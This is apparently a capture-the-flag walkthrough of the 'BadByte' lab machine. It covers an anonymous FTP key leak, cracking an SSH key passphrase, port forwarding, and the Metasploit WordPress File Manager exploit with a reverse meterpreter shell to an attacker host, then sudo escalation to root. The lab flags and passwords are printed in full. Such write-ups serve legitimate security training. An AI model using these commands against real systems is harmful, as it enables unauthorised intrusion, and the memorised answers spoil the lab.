# Badbyte

Infiltrate BadByte and help us to take over root.

# Reconnaissance

## How many ports are open?

Running a Nmap full scan will reveal 2 ports:

~~~
kali@kali:/data/Badbyte$ nmap -A -p 22,30024 10.10.11.45
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-03 14:00 CEST
Nmap scan report for 10.10.11.45
Host is up (0.044s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
|_  256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)
30024/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23 20:03 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23 20:09 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.50.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.35 seconds
~~~

Answer: `2`

##What service is running on the lowest open port?

Answer: `ssh`

##What non-standard port is open?

Answer: `30024`

##What service is running on the non-standard port?

Answer: `ftp`

# Foothold

## What username do we find during the enumeration process?

The FTP service allows anonymous connection:

~~~
kali@kali:/data/Badbyte$ ftp 10.10.11.45 30024
Connected to 10.10.11.45.
220 (vsFTPd 3.0.3)
Name (10.10.11.45:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
~~~

Listing the files will reveal 2 files:

~~~
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Mar 23 20:09 .
drwxr-xr-x    2 ftp      ftp          4096 Mar 23 20:09 ..
-rw-r--r--    1 ftp      ftp          1743 Mar 23 20:03 id_rsa
-rw-r--r--    1 ftp      ftp            78 Mar 23 20:09 note.txt
226 Directory send OK.
~~~

The txt file is a note that discloses a username: `errorcauser`.

~~~
ftp> get note.txt -
remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (78 bytes).
I always forget my password. Just let me store an ssh key here.
- errorcauser
226 Transfer complete.
78 bytes received in 0.00 secs (72.6831 kB/s)
~~~

We'll download the `id_rsa` file as it is likely a SSH private key.

~~~
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
226 Transfer complete.
1743 bytes received in 0.00 secs (803.2791 kB/s)
ftp> exit
221 Goodbye.
~~~

Answer: `errorcauser`

## What is the passphrase for the RSA private key?

Now, give the key the appropriate privileges and use it to connect against the SSH service. Unfortunately, it is password protected:

~~~
kali@kali:/data/Badbyte/files$ chmod 600 id_rsa 
kali@kali:/data/Badbyte/files$ ssh -i id_rsa errorcauser@10.10.11.45
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': 
~~~

Let's crack the key with John the Ripper:

~~~
kali@kali:/data/Badbyte/files$ /data/src/john/run/ssh2john.py id_rsa > ssh.hash
kali@kali:/data/Badbyte/files$ /data/src/john/run/john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cupcake          (id_rsa)
1g 0:00:00:14 DONE (2021-05-03 14:02) 0.06729g/s 965120p/s 965120c/s 965120C/sa6_123..*7¡Vamos!
Session completed. 
~~~

Answer: `cupcake`

# Port forwarding

## What main TCP ports are listening on localhost?

Now that we have the passphrase, we can connect. There is a note that lets us know there is a web server running, but only accessible to localhost.

~~~
-bash-4.4$ cat note.txt
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)
~~~

Disconnect and reconnect using the following option to setup Dynamic Port Forwarding using SSH:

~~~
kali@kali:/data/Badbyte/files$ ssh -i id_rsa -D 1337 errorcauser@10.10.11.45
~~~

Now, set up proxychains for the Dynamic Port Forwarding. Ensure you have commented out `socks4 127.0.0.1 9050` in your proxychains configuration and have added `socks5 127.0.0.1 1337` to the end of configuration file (`/etc/proxychains.conf`):

~~~
kali@kali:/etc$ egrep '^[^#]' /etc/proxychains.conf 
strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5	127.0.0.1 1337
~~~

Running a port scan to enumerate internal ports on the server using proxychains will now reveal the web port, as well as MySQL:

~~~
kali@kali:/etc$ proxychains nmap -sT 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-03 14:29 CEST
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:80-<><>-OK
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:5900-<--timeout
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:3389-<--timeout

[REDACTED]

|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:1048-<--timeout
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:49154-<--timeout
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:646-<--timeout
Nmap scan report for localhost (127.0.0.1)
Host is up (0.046s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 48.29 seconds
~~~

After finding the port of the webserver, perform Local Port Forwarding to that port using SSH with the -L flag:

~~~
kali@kali:/data/Badbyte/files$ sudo ssh -i id_rsa -L 80:127.0.0.1:80 errorcauser@10.10.11.45
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': cupcake
~~~

Now, browsing http://127.0.0.1 will show the website that was supposed to be only accessible by localhost on the server.

Answer: `80,3306`

## What protocols are used for these ports?

Answer: `http,mysql`

# Web exploitation

## What CMS is running on the machine?

Browsing the web site (http://127.0.0.1) will show many indications about a Wordpress installation:

~~~
kali@kali:/etc$ curl -s http://127.0.0.1 | grep -i wordpress
<meta name="generator" content="WordPress 5.7" />
		</nav></section><section id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><nav role="navigation" aria-label="Recent Comments"><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='https://wordpress.org/' rel='external nofollow ugc' class='url'>A WordPress Commenter</a></span> on <a href="http://localhost/?p=1#comment-1">Welcome to Badbyte</a></li></ul></nav></section>	</aside><!-- .widget-area -->
				Proudly powered by <a href="https://en-gb.wordpress.org/">WordPress</a>.		</div><!-- .powered-by -->
~~~

Answer: `wordpress`

## Can you find any vulnerable plugins?

Using the `http-wordpress-enum` Nmap script will reveal 2 plugins:

~~~
kali@kali:/etc$ nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-03 18:01 CEST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
Initiating Ping Scan at 18:01
Scanning 127.0.0.1 [2 ports]
Completed Ping Scan at 18:01, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 18:01
Scanning localhost (127.0.0.1) [1 port]
Discovered open port 80/tcp on 127.0.0.1
Completed Connect Scan at 18:01, 0.00s elapsed (1 total ports)
NSE: Script scanning 127.0.0.1.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 6.66s elapsed
Nmap scan report for localhost (127.0.0.1)
Host is up, received syn-ack (0.00025s latency).
Scanned at 2021-05-03 18:01:27 CEST for 7s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
~~~

Two plugins are detected:
* duplicator 1.3.26
* wp-file-manager 6.0

## What is the CVE number for directory traversal vulnerability?

Searching on the Internet for `cve wordpress duplicator directory traversal` leads to `CVE-2020-11738`

Answer: `CVE-2020-11738`

## What is the CVE number for remote code execution vulnerability?

Searching for `cve wordpress remote code execution file manager` leads to `CVE-2020-25213`.

Answer: `CVE-2020-25213`

## There is a metasploit module for the exploit. You can use it to get the reverse shell. If you are feeling lucky you can follow any POC( Proof of Concept).

Fire up Metasploit and search for `wp-file-manager`. It will show an exploit.

~~~
kali@kali:~$ msfconsole -q
[*] Starting persistent handler(s)...
msf6 > search wp-file-manager

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_file_manager_rce
~~~

## What is the name of user that was running CMS?

Let's use this exploit to get a reverse meterpreter session.

~~~
msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST 10.8.50.72
LHOST => 10.8.50.72
msf6 exploit(multi/http/wp_file_manager_rce) > run

[*] Started reverse TCP handler on 10.8.50.72:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/CMRdTO.php
[*] Sending stage (39282 bytes) to 10.10.221.123
[+] Deleted CMRdTO.php
[*] Meterpreter session 1 opened (10.8.50.72:4444 -> 10.10.221.123:58718) at 2021-05-03 19:42:28 +0200

meterpreter > getuid
Server username: cth (1000)
~~~

Answer: `cth`

## What is the user flag?

~~~
meterpreter > shell
Process 1735 created.
Channel 0 created.

python3 -c "import pty;pty.spawn('/bin/bash')"
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

<ress/wp-content/plugins/wp-file-manager/lib/files$ cd /home
cd /home
cth@badbyte:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root root 4096 Mar 23 19:50 .
drwxr-xr-x 24 root root 4096 Mar 22 18:02 ..
drwxr-xr-x  4 cth  cth  4096 Mar 23 21:44 cth
drwxr-xr-x  8 root root 4096 Mar 23 21:30 errorcauser
cth@badbyte:/home$ ls -l cth
ls -l cth
total 4
-rw-rw-r-- 1 cth cth 38 Mar 23 21:36 user.txt
cth@badbyte:/home$ cat cth/user.txt            
cat cth/user.txt
THM{227906201d17d9c45aa93d0122ea1af7}
~~~

User flag: `THM{227906201d17d9c45aa93d0122ea1af7}`

# Privilege Escalation

## What is the user's old password?

Searching for files owned by `cth` will show a long list of files, with an interesting `bash.log` file:

~~~
cth@badbyte:/home$ find / -type f -user cth -exec ls {} + 2>/dev/null
find / -type f -user cth -exec ls {} + 2>/dev/null
/home/cth/.bash_logout
/home/cth/.bashrc
/home/cth/.cache/motd.legal-displayed
/home/cth/.profile

[REDACTED]

/usr/share/wordpress/wp-snapshots/robots.txt
/usr/share/wordpress/xmlrpc.php
/var/log/bash.log <-------------------------------- interesting!
~~~

Having a look at this file will show the last commands entered by the user, who typed his old password as a command, by mistake:

~~~
cth@badbyte:/home$ cat /var/log/bash.log
cat /var/log/bash.log
Script started on 2021-03-23 21:05:06+0000
cth@badbyte:~$ whoami
cth
cth@badbyte:~$ date
Tue 23 Mar 21:05:14 UTC 2021
cth@badbyte:~$ suod su

Command 'suod' not found, did you mean:

  command 'sudo' from deb sudo
  command 'sudo' from deb sudo-ldap

Try: sudo apt install <deb name>

cth@badbyte:~$ G00dP@$sw0rd2020 <----------------------- old password
G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully

[redACTED]
~~~

Answer: `G00dP@$sw0rd2020`


## What is the root flag?

Trying the old password won't work, but trying to increment the year (`2021` instead of `2020` at the end of the password) leads to a succesfull connection. The user has full access with `sudo`.

~~~
cth@badbyte:/home$ sudo -l
sudo -l
[sudo] password for cth: G00dP@$sw0rd2021

Matching Defaults entries for cth on badbyte:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cth may run the following commands on badbyte:
    (ALL : ALL) ALL
cth@badbyte:/home$ sudo -s
sudo -s
root@badbyte:/home# cd /root
cd /root
root@badbyte:~# ll
ll
total 24
drwx------  3 root root 4096 Mar 23 21:54 ./
drwxr-xr-x 24 root root 4096 Mar 22 18:02 ../
lrwxrwxrwx  1 root root    9 Mar 23 21:16 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Mar 22 18:31 .ssh/
-rw-r--r--  1 root root 1185 Mar 23 21:37 root.txt
root@badbyte:~# cat root.txt
cat root.txt
  |      ______    ________   ________              ______        _____________ __________  |
  |     / ____ \  /  ___   \ /   ____ \            / ____ \      /____    ____//   ______/\ |
  |    / /___/_/ /  /__/   //   /   / /\          / /___/_/      \___/   /\___/   /______\/ |
  |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
  |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
  | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   | 
  |                                  _________           __/   / /        \____________\/   |
  |                                 /________/\         /_____/ /                           |
  |                                 \________\/         \_____\/                            |

THM{ad485b44f63393b6a9225974909da5fa}

 ________________________
< Made with ❤ by BadByte >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
~~~

Root flag: `THM{ad485b44f63393b6a9225974909da5fa}`
